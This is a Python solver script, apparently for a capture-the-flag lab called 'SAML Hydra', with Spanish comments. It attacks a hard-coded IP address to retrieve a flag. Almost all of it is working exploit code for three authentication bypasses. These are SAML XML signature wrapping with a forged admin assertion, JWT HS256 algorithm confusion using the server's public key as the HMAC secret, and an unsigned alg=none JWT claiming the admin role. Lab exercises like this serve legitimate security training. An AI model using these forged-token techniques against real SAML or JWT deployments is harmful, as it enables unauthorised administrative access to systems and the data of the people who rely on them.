#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, re, time, base64, json, argparse, hmac, hashlib, random, string
from urllib import request, parse

DEFAULT_BASE = "http://209.159.156.142:8104/"

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")

def now() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

def rid(p="_") -> str:
    return p + "".join(random.choices(string.hexdigits.lower(), k=12))

def find_flag(html: str):
    m = re.search(r"(EIAPT\{[0-9a-fA-F]+\})", html)
    return m.group(1) if m else None

def http_get(url, cookie=None):
    req = request.Request(url, method="GET")
    if cookie:
        req.add_header("Cookie", f"hydra_session={cookie}")
    with request.urlopen(req) as resp:
        return resp.getcode(), resp.read()

def http_post_form(url, data_dict, cookie=None):
    data = parse.urlencode(data_dict).encode()
    req = request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    if cookie:
        req.add_header("Cookie", f"hydra_session={cookie}")
    with request.urlopen(req) as resp:
        return resp.getcode(), resp.read()

# -------------------- XSW --------------------
def build_saml_xsw():
    iss = now()
    return f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="{rid()}" Version="2.0" IssueInstant="{iss}">
  <saml:Issuer>evil-idp</saml:Issuer>

  <!-- Assertion 1: sin firma, ADMIN -->
  <saml:Assertion ID="{rid('_a')}">
    <saml:Subject><saml:NameID>admin@hydra.local</saml:NameID></saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="email"><saml:AttributeValue>admin@hydra.local</saml:AttributeValue></saml:Attribute>
      <saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>

  <!-- Assertion 2: con Signature dummy, USER -->
  <saml:Assertion ID="{rid('_b')}">
    <saml:Issuer>legit-idp</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
      </ds:SignedInfo>
      <ds:SignatureValue>AQAB</ds:SignatureValue>
    </ds:Signature>
    <saml:Subject><saml:NameID>user@hydra.local</saml:NameID></saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="email"><saml:AttributeValue>user@hydra.local</saml:AttributeValue></saml:Attribute>
      <saml:Attribute Name="role"><saml:AttributeValue>user</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>"""

def do_xsw(base):
    xml = build_saml_xsw()
    b64 = base64.b64encode(xml.encode()).decode()
    # alg=HS256 para que el servidor emita JWT HS256 usando la pública como “secreto”
    http_post_form(f"{base}/sso/acs", {"SAMLResponse": b64, "alg": "HS256"})
    code, html = http_get(f"{base}/dashboard")
    return find_flag(html.decode(errors="ignore"))

# -------------------- JWT HS256 directo --------------------
def hs256_sign(header: dict, payload: dict, secret: bytes) -> str:
    head = b64url(json.dumps(header, separators=(",", ":")).encode())
    body = b64url(json.dumps(payload, separators=(",", ":")).encode())
    sig  = b64url(hmac.new(secret, f"{head}.{body}".encode(), hashlib.sha256).digest())
    return f"{head}.{body}.{sig}"

def do_jwt(base):
    code, pem = http_get(f"{base}/static/certs/sp_public.pem")
    if code != 200:
        return None
    secret = pem  # pública como “secreto” HS256 (alg confusion)
    token = hs256_sign(
        {"alg": "HS256", "typ": "JWT"},
        {"sub": "admin@hydra.local", "role": "admin", "iat": int(time.time())},
        secret
    )
    code, html = http_get(f"{base}/dashboard", cookie=token)
    return find_flag(html.decode(errors="ignore"))

# -------------------- JWT alg=none directo --------------------
def do_none(base):
    header = {"alg": "none", "typ": "JWT"}
    payload = {"sub": "admin@hydra.local", "role": "admin", "iat": int(time.time())}
    token = f"{b64url(json.dumps(header).encode())}.{b64url(json.dumps(payload).encode())}."
    code, html = http_get(f"{base}/dashboard", cookie=token)
    return find_flag(html.decode(errors="ignore"))

def main():
    ap = argparse.ArgumentParser(description="SAML Hydra solver (stdlib only)")
    ap.add_argument("base", nargs="?", default=DEFAULT_BASE, help=f"URL base (default: {DEFAULT_BASE})")
    ap.add_argument("--mode", choices=["xsw","jwt","none","auto"], default="auto",
                    help="xsw | jwt | none | auto (default)")
    args = ap.parse_args()
    base = args.base.rstrip("/")

    if args.mode in ("xsw","auto"):
        flag = do_xsw(base)
        if flag: print("[+] FLAG (XSW):", flag); return

    if args.mode in ("jwt","auto"):
        flag = do_jwt(base)
        if flag: print("[+] FLAG (JWT HS256):", flag); return

    if args.mode in ("none","auto"):
        flag = do_none(base)
        if flag: print("[+] FLAG (alg=none):", flag); return

    print("[-] No salió la FLAG (intentos: XSW → JWT → none).")
    print("    Revisa logs:  docker logs -f saml-hydra")
    print("    También prueba manual:  curl -H \"Cookie: hydra_session=<TOKEN>\" http://127.0.0.1:8104/dashboard")

if __name__ == "__main__":
    main()
